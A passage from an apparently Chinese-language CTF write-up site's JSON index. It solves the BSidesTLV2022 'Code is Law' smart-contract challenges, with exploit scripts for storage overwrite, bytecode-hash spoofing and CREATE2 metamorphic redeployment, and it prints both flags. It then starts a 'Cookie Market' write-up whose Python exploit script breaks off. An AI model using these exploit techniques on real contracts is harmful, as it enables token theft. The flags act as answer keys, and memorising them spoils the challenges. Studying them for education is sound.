\"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); let salt = 1 ; let deployerFactory = await ethers . getContractFactory ( \"Deployer\" ); let deployer = await deployerFactory . deploy (); await deployer . deployed (); let onlyICanHazTokenFactory = await ethers . getContractFactory ( 'OnlyICanHazToken' ); await deployer . deploy ( onlyICanHazTokenFactory . bytecode , salt ); let deployAddr = await deployer . deployAddr (); challengeToken . can_i_haz_token ( deployAddr ); let onlyICanHazToken = await ethers . getContractAt ( \"OnlyICanHazToken\" , deployAddr ); await onlyICanHazToken . bye (); let withdrawerFactory = await ethers . getContractFactory ( 'Withdrawer' ); await deployer . deploy ( withdrawerFactory . bytecode , salt ); let withdrawer = await ethers . getContractAt ( \"Withdrawer\" , deployAddr ); await withdrawer . withdraw (); const returnedFlag = await challengeToken . did_i_win (); console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); Flag \u00b6 Code is Law 1 \u00b6 BSidesTLV2022{c0nstUct!v3_m@g!3_ind3ed} Code is Law 2 \u00b6 BSidesTLV2022{W!L3_M@g!3_in_the_w3rld} \u53c2\u8003\u8d44\u6599 \u00b6 ContractFactory | ethers EVM Dialect Overwriting Smart Contracts Local ERC20 Balance Manipulation (with HardHat) \u21a9 Code is Law 1: Solidity CTF Challenge Writeup | by Oren Yomtov \u21a9 Code is Law 2: Solidity CTF Challenge Writeup | by Oren Yomtov \u21a9 Contract Metadata \u21a9","title":"Code is Law"},{"location":"blockchain/code_is_law/#_1","text":"Download the zip file and follow the instructions in the README.md file to solve the solidity challenge. code-is-law-1.zip code-is-law-2.zip OnlyICanHazToken.sol 1 2 3 4 5 6 7 8 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; contract OnlyICanHazToken { function bye () public { selfdestruct ( payable ( msg . sender )); } } index.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import { expect } from \"chai\" ; import { ethers } from \"hardhat\" ; import { ChallengeToken } from \"../typechain\" ; // This \"Challenge Setup\" block must be left as-is describe ( \"Challenge Setup\" , function () { it ( \"Should deploy ChallengeToken\" , async function () { const ChallengeTokenFactory = await ethers . getContractFactory ( \"ChallengeToken\" , ( await ethers . getSigners ()). pop ()); const challengeToken = await ChallengeTokenFactory . deploy (); await challengeToken . deployed (); }); }); // Try to solve the challenge below this line // Run `npx hardhat ctf-try` to test your solution locally // Run `npx hardhat ctf-try --submit` to submit your solution to the remote CTF node and get the real flag describe ( \"Solve Challenge\" , function () { let challengeToken : ChallengeToken ; it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); });","title":"\u9898\u76ee"},{"location":"blockchain/code_is_law/#code-is-law-1","text":"ChallengeToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 // SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"hardhat/console.sol\" ; contract ChallengeToken is ERC20 { bytes32 private onlyICanHazTokenContractCodeHash = 0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3 ; constructor () ERC20 ( \"ChallengeToken\" , \"BSIDES2022\" ) {} function did_i_win () public view returns ( string memory ) { if ( balanceOf ( msg . sender ) == 0 ) { revert ( \"you shall not pass\" ); } return \"BSidesTLV2022{PLACEHOLDER}\" ; } function can_i_haz_token ( address receiver ) public { require ( receiver == calculateAddressOfTheFirstContractDeployedBy ( tx . origin ), \"receiver is ineligible for a token because they are not the first contract deployed by the EOA who initiated this transaction\" ); require ( getContractCodeHash ( receiver ) == onlyICanHazTokenContractCodeHash , \"receiver is ineligible for a token because their codehash does not match the specific contract codehash required\" ); if ( balanceOf ( receiver ) == 0 ) { _mint ( receiver , 1 ); } } function getContractCodeHash ( address contractAddress ) private view returns ( bytes32 callerContractCodeHash ) { assembly { callerContractCodeHash := extcodehash ( contractAddress ) } } // Copied from https://ethereum.stackexchange.com/a/87840 function calculateAddressOfTheFirstContractDeployedBy ( address deployer ) private pure returns ( address _address ) { bytes32 hash = keccak256 ( abi . encodePacked ( bytes1 ( 0xd6 ), bytes1 ( 0x94 ), deployer , bytes1 ( 0x80 )) ); assembly { mstore ( 0 , hash ) _address := mload ( 0 ) } } }","title":"Code is Law 1"},{"location":"blockchain/code_is_law/#code-is-law-2","text":"ChallengeToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"hardhat/console.sol\" ; contract ChallengeToken is ERC20 { bytes32 private onlyICanHazTokenContractCodeHash = 0x1431A52467B8E0B496D710A30B897A6EB093CD9137FBF9B34B47441FD5E868F3 ; constructor () ERC20 ( \"ChallengeToken\" , \"BSIDES2022\" ) {} function did_i_win () public view returns ( string memory ) { if ( balanceOf ( msg . sender ) == 0 ) { revert ( \"you shall not pass\" ); } return \"BSidesTLV2022{PLACEHOLDER}\" ; } function can_i_haz_token ( address receiver ) public { require ( getContractCodeHash ( receiver ) == onlyICanHazTokenContractCodeHash , \"receiver is ineligible for a token because their codehash does not match the specific contract codehash required\" ); if ( balanceOf ( receiver ) == 0 ) { _mint ( receiver , 1 ); } } function getContractCodeHash ( address contractAddress ) private view returns ( bytes32 callerContractCodeHash ) { assembly { callerContractCodeHash := extcodehash ( contractAddress ) } } function approve ( address spender , uint256 amount ) public override returns ( bool ) { return false ; } }","title":"Code is Law 2"},{"location":"blockchain/code_is_law/#english-ver","text":"\u5f53 ChallengeToken.did_i_win() \u7684 msg.sender \u6240\u5728\u5730\u5740\u6301\u6709 token \u65f6\u5c31\u80fd\u83b7\u5f97 flag \u9996\u5148\u5206\u6790 Code is Law 1 \u7684 ChallengeToken \u5408\u7ea6 ChallengeToken \u901a\u8fc7\u51fd\u6570 can_i_haz_token \u53d1\u653e token \uff0c\u4f46\u53ea\u6709\u5408\u7ea6 receiver \u5728 tx.origin \u521d\u6b21\u90e8\u7f72\u5408\u7ea6\u7684\u5730\u5740\u4e0a\uff0c\u4e14\u5408\u7ea6\u4ee3\u7801\u7684\u54c8\u5e0c\u503c\u4e0e onlyICanHazTokenContractCodeHash \u76f8\u7b49\u65f6\u624d\u80fd\u83b7\u5f97 \u90a3\u4e48\uff0c\u5148\u8ba9\u5408\u7ea6 OnlyICanHazToken \u83b7\u5f97 token \u518d\u8f6c\u79fb\u5462\uff1f\u4f46 selfdestruct(payable(msg.sender)) \u53ea\u80fd\u8f6c\u79fb\u4ee5\u592a\u5e01\uff0c\u65e0\u6cd5\u8f6c\u79fb token \u518d\u56de\u5934\u770b\u770b ChallengeToken \u7684 getContractCodeHash \u548c calculateAddressOfTheFirstContractDeployedBy \u4f3c\u4e4e\u4e5f\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898\uff0c ERC20 \u5c31\u66f4\u4e0d\u53ef\u80fd\u4e86 uwu \u6700\u540e\u628a\u6ce8\u610f\u529b\u8f6c\u79fb\u5230\u4e86 hardhat \u4e0a\uff0c\u53d1\u73b0\u4e86\u80fd\u4fee\u6539\u5408\u7ea6\u5b58\u50a8\u7684 hardhat_setStorageAt 1 \uff08\u662f\u795e (\u2565\u03c9\u2565)\uff09\uff0c\u7ed3\u5408\u5408\u7ea6\u53d8\u91cf\u7684\u5b58\u50a8\u4f4d\u7f6e\u3001\u65b9\u5f0f\u76f4\u63a5\u4fee\u6539\u4f59\u989d\u5c31\u597d\u4e86\uff01 1 2 3 4 5 6 7 8 9 10 it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); let [ player ] = await ethers . getSigners (); let playerHash = await ethers . utils . solidityKeccak256 ([ \"uint256\" , \"uint\" ], [ player . address , 0 ]); await ethers . provider . send ( \"hardhat_setStorageAt\" , [ challengeToken . address , playerHash , ethers . utils . hexZeroPad ( ethers . utils . hexlify ( 1 ), 32 )]); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) }); ChallengeToken \u7ee7\u627f\u81ea ERC20 \uff0c\u53d8\u91cf _balances \u7528\u4e8e\u5b58\u50a8\u5404\u4e2a\u8d26\u6237\u5730\u5740\u5bf9\u5e94\u7684\u4f59\u989d _balances \u4e3a mapping \u7c7b\u578b\uff0c\u5360\u7528 slot 0 \uff0c\u90a3\u4e48\u5730\u5740 A \u7684\u4f59\u989d\u5b58\u50a8\u4f4d\u7f6e\u5728 keccak256(A | 0) \uff0c | \u8868\u793a\u8fde\u63a5 Code is Law 2 \u4e0e Code is Law 1 \u76f8\u6bd4\uff0c\u53ea\u4fee\u6539\u4e86 ChallengeToken \u53d1\u653e token \u7684\u89c4\u5219\u5e76\u7981\u7528\u4e86 approve \uff0c\u56e0\u800c\u4fee\u6539\u5b58\u50a8\u7684\u65b9\u6cd5\u4ecd\u7136\u9002\u7528 =\uff09 \u770b\u4e86\u5b98\u65b9 WP 2 3 \u518d\u6765\u8865\u5145\u4e00\u4e0b =\u03c9=","title":"\u89e3\u9898\u601d\u8def English ver."},{"location":"blockchain/code_is_law/#code-is-law-1_1","text":"\u5173\u952e\u70b9\u5728\u4e8e\u6784\u9020\u51fd\u6570\u4e0d\u662f\u5408\u7ea6\u4ee3\u7801\u7684\u4e00\u90e8\u5206\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 OnlyICanHazToken \u7684\u6784\u9020\u51fd\u6570\u4e2d approve \u6269\u5c55\u5408\u7ea6 OnlyICanHazToken 1 2 3 4 5 6 7 8 9 10 11 12 13 14 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"./ChallengeToken.sol\" ; contract ExtOnlyICanHazToken { constructor () { ChallengeToken ( 0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f ). approve ( msg . sender , 1 ); } function bye () public { selfdestruct ( payable ( msg . sender )); } } \u4e0d\u8fc7\uff0c\u76f4\u63a5\u4f7f\u7528\u5408\u7ea6 ExtOnlyICanHazToken \u4ecd\u7136\u4f1a\u5f97\u5230\u62a5\u9519 receiver is ineligible for a token because their codehash does not match the specific contract codehash required :( \u6253\u5370\u5408\u7ea6 OnlyICanHazToken \u548c ExtOnlyICanHazToken \u7684\u5b57\u8282\u7801\u8fdb\u884c\u5bf9\u6bd4 1 2 3 4 console . log (( await ethers . getContractFactory ( \"OnlyICanHazToken\" )). bytecode ); // 0x6080604052348015600f57600080fd5b5060848061001e6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea26469706673582212208288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff64736f6c63430008040033 console . log (( await ethers . getContractFactory ( \"ExtOnlyICanHazToken\" )). bytecode ); // 0x608060405234801561001057600080fd5b507373511669fd4de447fed18bb79bafeac93ab7f31f73ffffffffffffffffffffffffffffffffffffffff1663095ea7b33360016040518363ffffffff1660e01b8152600401610061929190610115565b602060405180830381600087803b15801561007b57600080fd5b505af115801561008f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100b391906100ce565b506101af565b6000815190506100c881610198565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b6101008161013e565b82525050565b61010f81610186565b82525050565b600060408201905061012a60008301856100f7565b6101376020830184610106565b9392505050565b60006101498261015c565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006101918261017c565b9050919050565b6101a181610150565b81146101ac57600080fd5b50565b6084806101bd6000396000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb2964736f6c63430008040033 \u5b57\u8282\u7801 39 \u5c06\u5408\u7ea6\u4ee3\u7801\u62f7\u8d1d\u5230\u5185\u5b58\u4e2d\uff0c\u6240\u4ee5\u6bd4\u8f83\u4e24\u4efd\u5408\u7ea6\u4ee3\u7801\u6700\u540e\u4e00\u4e2a 39 \u540e\u7684\u5b57\u8282\u7801\uff0c\u53d1\u73b0\u6709\u4e00\u5c0f\u6bb5\u5dee\u5f02 1 2 6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_8288fb767ec1f00b6068ee0de53f59961ced5ec5d3e1770e0a0a46ede725d1ff_64736f6c63430008040033 6000f3fe6080604052348015600f57600080fd5b506004361060285760003560e01c8063e71b8b9314602d575b600080fd5b60336035565b005b3373ffffffffffffffffffffffffffffffffffffffff16fffea2646970667358221220_497d6dee22cd21fcfafd049f00aefcfe7425aa5efdc817d1afe4473a9e7ceb29_64736f6c63430008040033 \u7f16\u8bd1\u5668\u9ed8\u8ba4\u4f1a\u5c06 metadata \u6587\u4ef6\u7684 IPFS \u54c8\u5e0c\u6dfb\u52a0\u5230\u5b57\u8282\u7801\u7684\u672b\u5c3e 4 \uff0c v0.8.0 \u7248\u672c\u7684\u7f16\u8bd1\u5668\u901a\u5e38\u6309\u5982\u4e0b\u683c\u5f0f\u6dfb\u52a0 1 2 3 4 0xa2 0x64 'ipfs'(69706673) 0x58 0x22 <34 bytes IPFS hash> 0x64 'solc'(736f6c63) 0x43 <3 byte version encoding> 0x00 0x33 \u4e3a\u4e86\u901a\u8fc7 extcodehash \u7684\u68c0\u67e5\uff0c\u53ef\u4ee5\u4f7f\u7528 OnlyICanHazToken \u8986\u76d6 ExtOnlyICanHazToken IPFS \u54c8\u5e0c\u90e8\u5206\u7684\u5b57\u8282\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 it ( \"Should return the winning flag\" , async function () { let onlyICanHazTokenFactory = await ethers . getContractFactory ( 'OnlyICanHazToken' ); let extOnlyICanHazTokenFactory = await ethers . getContractFactory ( 'ExtOnlyICanHazToken' ); let [ player ] = await ethers . getSigners (); const ExtOnlyICanHazTokenFactory = new ethers . ContractFactory ( onlyICanHazTokenFactory . interface , extOnlyICanHazTokenFactory . bytecode . substring ( 0 , extOnlyICanHazTokenFactory . bytecode . length - 100 ) + onlyICanHazTokenFactory . bytecode . substring ( onlyICanHazTokenFactory . bytecode . length - 100 ), player ); let extOnlyICanHazToken = await ExtOnlyICanHazTokenFactory . deploy (); await extOnlyICanHazToken . deployed (); challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); await challengeToken . can_i_haz_token ( extOnlyICanHazToken . address ); await challengeToken . transferFrom ( extOnlyICanHazToken . address , player . address , 1 ); const returnedFlag = await challengeToken . did_i_win () console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) });","title":"Code is Law 1"},{"location":"blockchain/code_is_law/#code-is-law-2_1","text":"approve \u88ab\u7981\u7528\u4e86\uff0c\u4f46\u53d1\u653e token \u7684\u89c4\u5219\u6709\u6240\u5bbd\u9650\uff0c\u4e0d\u518d\u9700\u8981\u662f tx.origin \u521d\u6b21\u90e8\u7f72\u7684\u5408\u7ea6 \u4e0d\u8fc7 Code is Law 1 \u4e2d calculateAddressOfTheFirstContractDeployedBy \u4f9d\u636e\u7684\u662f CREATE \u64cd\u4f5c\u7801\u7684\u5730\u5740\u8ba1\u7b97\u89c4\u5219\uff0c\u5373\u65b0\u5408\u7ea6\u7684\u5730\u5740\u4e0e\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\u548c\u7531\u521b\u5efa\u8005\u53d1\u8d77\u7684\u4ea4\u6613\u7684\u6570\u91cf\u6709\u5173\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5408\u7ea6\u8fd8\u53ef\u4ee5\u901a\u8fc7 CREATE2 \u64cd\u4f5c\u7801\u521b\u5efa\uff0c\u6b64\u65f6\u7684\u5408\u7ea6\u5730\u5740\u4e0e\u5408\u7ea6\u521b\u5efa\u8005\u7684\u5730\u5740\u3001\u53c2\u6570 salt \u548c\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u6709\u5173\uff0c\u82e5\u4fdd\u6301\u5408\u7ea6\u521b\u5efa\u4ee3\u7801\u4e0d\u53d8\uff0c\u4e14\u6784\u9020\u51fd\u6570\u8fd4\u56de\u7684\u8fd0\u884c\u65f6\u5b57\u8282\u7801\u53ef\u63a7\uff0c\u5c31\u53ef\u4ee5\u5728\u540c\u4e00\u5730\u5740\u4e0a\u53cd\u590d\u90e8\u7f72\u5b8c\u5168\u4e0d\u540c\u7684\u5408\u7ea6 \u63a5\u4e0b\u6765\u601d\u8def\u5c31\u5f88\u6e05\u6670\u5566\uff0c\u5148\u5229\u7528 CREATE2 \u90e8\u7f72 OnlyICanHazToken \u5e76\u5728\u53d6\u5f97 token \u540e selfdestruct \uff0c\u518d\u5728\u76f8\u540c\u5730\u5740\u4e0a\u90e8\u7f72\u65b0\u7684\u5408\u7ea6\u6765\u8f6c\u79fb token \u5408\u7ea6 Deployer \u8d1f\u8d23\u90e8\u7f72\u6307\u5b9a\u5408\u7ea6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; contract Deployer { mapping ( address => address ) _implementations ; address public deployAddr ; // will be called by the metamorphic Contract function getImplementation () external view returns ( address implementation ) { return _implementations [ msg . sender ]; } function _getMetamorphicContractAddress ( uint256 salt , bytes memory metamorphicCode ) internal view returns ( address ) { // determine the address of the metamorphic contract. return address ( uint160 ( uint256 ( keccak256 ( abi . encodePacked ( hex \"ff\" , address ( this ), salt , keccak256 ( abi . encodePacked ( metamorphicCode ))))))); } function deploy ( bytes calldata bytecode , uint256 salt ) public { bytes memory implInitCode = bytecode ; // assign the initialization code for the metamorphic contract. bytes memory metamorphicCode = ( hex \"5860208158601c335a63aaf10f428752fa158151803b80938091923cf3\" // here 3c (extcodecopy) is used, not 39 (codecopy) ); // declare a variable for the address of the implementation contract. address implementationContract ; // load implementation init code and length, then deploy via CREATE. assembly { implementationContract := create ( 0 , add ( 0x20 , implInitCode ), mload ( implInitCode )) } address metamorphicContractAddress = _getMetamorphicContractAddress ( salt , metamorphicCode ); // first we deploy the code we want to deploy on a separate address // store the implementation to be retrieved by the metamorphic contract. _implementations [ metamorphicContractAddress ] = implementationContract ; address addr ; assembly { addr := create2 ( 0 , // send 0 wei add ( 0x20 , metamorphicCode ), // load initialization code. mload ( metamorphicCode ), // load init code's length. salt ) } deployAddr = addr ; } } \u5408\u7ea6 Withdrawer \u7528\u4e8e\u8f6c\u79fb token \uff0c\u5728 OnlyICanHazToken \u5b9e\u4f8b\u81ea\u6bc1\u540e\u7531 Deployer \u90e8\u7f72\u5230\u539f OnlyICanHazToken \u5b9e\u4f8b\u6240\u5728\u7684\u5730\u5740 1 2 3 4 5 6 7 8 9 10 //SPDX-License-Identifier: Unlicense pragma solidity ^ 0.8.0 ; import \"./ChallengeToken.sol\" ; contract Withdrawer { function withdraw () public { ChallengeToken ( 0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f ). transfer ( msg . sender , 1 ); } } \u5408\u7ea6\u4ea4\u4e92\u8fc7\u7a0b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 it ( \"Should return the winning flag\" , async function () { challengeToken = await ethers . getContractAt ( \"ChallengeToken\" , \"0x73511669fd4dE447feD18BB79bAFeAC93aB7F31f\" ); let salt = 1 ; let deployerFactory = await ethers . getContractFactory ( \"Deployer\" ); let deployer = await deployerFactory . deploy (); await deployer . deployed (); let onlyICanHazTokenFactory = await ethers . getContractFactory ( 'OnlyICanHazToken' ); await deployer . deploy ( onlyICanHazTokenFactory . bytecode , salt ); let deployAddr = await deployer . deployAddr (); challengeToken . can_i_haz_token ( deployAddr ); let onlyICanHazToken = await ethers . getContractAt ( \"OnlyICanHazToken\" , deployAddr ); await onlyICanHazToken . bye (); let withdrawerFactory = await ethers . getContractFactory ( 'Withdrawer' ); await deployer . deploy ( withdrawerFactory . bytecode , salt ); let withdrawer = await ethers . getContractAt ( \"Withdrawer\" , deployAddr ); await withdrawer . withdraw (); const returnedFlag = await challengeToken . did_i_win (); console . log ( `\\tThe returned flag is: \" ${ returnedFlag } \"` ) });","title":"Code is Law 2"},{"location":"blockchain/code_is_law/#flag","text":"","title":"Flag"},{"location":"blockchain/code_is_law/#code-is-law-1_2","text":"BSidesTLV2022{c0nstUct!v3_m@g!3_ind3ed}","title":"Code is Law 1"},{"location":"blockchain/code_is_law/#code-is-law-2_2","text":"BSidesTLV2022{W!L3_M@g!3_in_the_w3rld}","title":"Code is Law 2"},{"location":"blockchain/code_is_law/#_2","text":"ContractFactory | ethers EVM Dialect Overwriting Smart Contracts Local ERC20 Balance Manipulation (with HardHat) \u21a9 Code is Law 1: Solidity CTF Challenge Writeup | by Oren Yomtov \u21a9 Code is Law 2: Solidity CTF Challenge Writeup | by Oren Yomtov \u21a9 Contract Metadata \u21a9","title":"\u53c2\u8003\u8d44\u6599"},{"location":"blockchain/cookie_market/","tags":["smart contract"],"text":"#smart contract .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 The cookie market is bustling with activity as vendors sell their festive treats and holiday shoppers rush to find the perfect cookies for their loved ones. As Santa Claus makes his way through the market, he is greeted with warm smiles and cheerful greetings from the vendors and shoppers alike. Children run up to him, excited to see the jolly old man in person, and Santa takes the time to chat with them and hear their holiday wishes. As he moves from booth to booth, Santa tastes a variety of cookies, from classic sugar cookies decorated with frosting and sprinkles, to more exotic flavors like gingerbread and spiced shortbread. He even tries his hand at decorating a few cookies himself, much to the delight of the children watching. After he has gathered all the supplies he needs, Santa thanks the vendors and shoppers for their hospitality and heads back to his workshop to begin preparing for his long journey. As he sets off, he is filled with the warmth and joy of the holiday season, knowing that he will bring a little bit of that magic to every child he visits. nc challs.htsp.ro 9002 cookie.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // SPDX-License-Identifier: MIT pragma solidity 0.8.17 ; import \"./ERC721.sol\" ; contract Cookie is ERC721 ( \"cookie\" , \"E\" ) { uint256 public cookieIDX ; address public owner ; constructor (){ cookieIDX = 0 ; } // @dev mints an cookie. Note that there are only 10 cookies in the basket. function mintcookie () external { require ( cookieIDX < 10 ); _mint ( msg . sender , cookieIDX ); cookieIDX += 1 ; } } CookieMarket.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 // SPDX-License-Identifier: MIT pragma solidity 0.8.17 ; import \"./IERC721.sol\" ; import \"./IERC721Receiver.sol\" ; contract CookieMarket is IERC721Receiver { // mapping that handles ownership of the cookies within the CookieMarket. mapping ( uint256 => address ) public canRedeemcookie ; // struct that handles the orders in the market struct sell_Order { uint256 cookie_idx_offered ; // the ERC721 idx of the \"cookie\" token. uint256 amount_eth_wanted ; // the amount of ETH the seller wants to receive for the cookie. address cookie_provider ; // the address of the seller. } // storing all the sell orders in the market. sell_Order [] public sellOrders ; // cookie IERC721 public cookie ; /** @dev cookieMarket constructor. @param _cookie ERC721 contract instance. */ constructor ( address _cookie ) { cookie = IERC721 ( _cookie ); } /** @dev Allows a buyer to buy an cookie from the cookieMarket via exhausting its subsequent sell order. @param _idx The ERC721 idx of the cookie. @param _owner The `current` owner of the cookie. */ function executeOrder ( uint256 _idx , address _owner ) external payable { require ( msg . sender != _owner , \"err: no self-exchanges allowed\" ); // find the sellOrder whose cookie_idx_offered == _idx for ( uint256 i = 0 ; i < sellOrders . length ; i ++ ) { if ( sellOrders [ i ]. cookie_idx_offered == _idx ) { // check if the _owner is the seller require ( sellOrders [ i ]. cookie_provider == _owner , \"err: _owner != seller\" ); // the cookie is for sale. // check if the msg.sender has provided enough ETH to pay for the cookie if ( msg . value >= sellOrders [ i ]. amount_eth_wanted ) { // the _owner has enough ETH to pay for the cookie // paying the seller(current owner) of the cookie ( bool sent , bytes memory data ) = _owner . call { value : msg . value }( \"\" ); require ( sent , \"err: transfer failed\" ); // transfer the ownership of the cookie from the seller to the buyer canRedeemcookie [ _idx ] = msg . sender ; // remove the sellOrder from the sellOrders array sellOrders [ i ] = sellOrders [ sellOrders . length - 1 ]; sellOrders . pop (); break ; } } } } /** @dev Function to retrieve an cookie from the market. @param _idx The index of the cookie in the market. */ function redeemcookies ( uint256 _idx ) external { // check if sender can redeem the cookie require ( canRedeemcookie [ _idx ] == msg . sender , \"err: msg.sender != owner(cookie)\" ); // approve the cookie transfer. cookie . approve ( msg . sender , _idx ); // transfer the ownership of the cookie. cookie . transferFrom ( address ( this ), msg . sender , _idx ); // remove the cookie _idx from the canRedeemcookie mapping delete canRedeemcookie [ _idx ]; } /** @dev Function to effectively add a sellOrder for your cookie on the cookieMarket. @param _cookieIDX The index of the ERC721 cookie. @param _ethWanted The amount of ETH the seller wants to receive for the cookie. */ function addSellOrder ( uint256 _cookieIDX , uint256 _ethWanted ) external { // check whether the msg.sender can sell the _cookieIDX require ( canRedeemcookie [ _cookieIDX ] == msg . sender , \"err: msg.sender != owner(cookie[_cookieIDX])\" ); // create the new sellOrder sell_Order memory newOrder ; newOrder . cookie_idx_offered = _cookieIDX ; newOrder . amount_eth_wanted = _ethWanted ; newOrder . cookie_provider = msg . sender ; sellOrders . push ( newOrder ); } /** @dev Function to effectively remove a sellOrder from the cookieMarket. @param _cookieIDX The index of the ERC721 cookie. */ function removeSellOrder ( uint256 _cookieIDX ) external { // iterate through all sellOrders for ( uint256 i = 0 ; i < sellOrders . length ; i ++ ) { // check if the sellOrder is for the _cookieIDX if ( sellOrders [ i ]. cookie_idx_offered == _cookieIDX ) { // check if the msg.sender is the owner of the cookie require ( sellOrders [ i ]. cookie_provider == msg . sender , \"err: msg.sender != cookie_provider\" ); // delete the sellOrder sellOrders [ i ] = sellOrders [ sellOrders . length - 1 ]; sellOrders . pop (); break ; } } } /** @dev Inherited from IERC721Receiver. */ function onERC721Received ( address , address _from , uint256 _tokenId , bytes calldata ) external override returns ( bytes4 ) { // we have received an cookie from its owner; mark that in the redeem mapping canRedeemcookie [ _tokenId ] = _from ; return this . onERC721Received . selector ; } } Hint \u00b6 Retrieve the OG cookie to get the flag! \u89e3\u9898\u601d\u8def \u00b6 \u9700\u8981\u83b7\u5f97\u7f16\u53f7 0 \u7684 cookie\uff0c\u521d\u59cb\u7531 deployer \u83b7\u5f97\u5e76\u8f6c\u7ed9\u5408\u7ea6 CookieMarket \u6839\u636e canRedeemcookie \u7684\u8bb0\u5f55\uff0c\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570 redeemcookies \u8d4e\u56de\u6307\u5b9a\u7f16\u53f7\u7684 cookie\uff0c\u76f4\u63a5\u8c03\u7528 onERC721Received \u66f4\u65b0\u7f16\u53f7\u4e3a 0 \u7684 cookie \u6240\u6709\u8005\u518d\u8d4e\u56de\u5373\u53ef \u56e0\u4e3a onERC721Received \u662f hook \u51fd\u6570\uff0c\u8d77\u521d\u5e76\u6ca1\u6709\u610f\u8bc6\u5230\u53ef\u4ee5\u88ab\u76f4\u63a5\u8c03\u7528 XD Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from web3 import Web3 from pwn import * def transact ( func , gas = 1000000 ): tx = account . sign_transaction ( eval ( func ) . buildTransaction ({ 'chainId' : w3 . eth . chain_id , 'nonce' : w3 . eth . get_transaction_count ( account . address ), 'gas' : gas , 'gasPrice' : w3 . eth . gas_price , })) . rawTransaction tx_hash = w3 . eth . send_raw_transaction ( tx ) . hex () return w3 . eth . wait_for_transaction_receipt ( tx_hash ) conn = remote ( 'challs.htsp.ro' , 9002 ) conn . sendlineafter ( 'action?' , '1' ) uuid = conn . recvline_contains ( 'uuid' ) . decode () . split ( ' ' )[ - 1 ] . strip () w3 = Web3 ( Web3 . 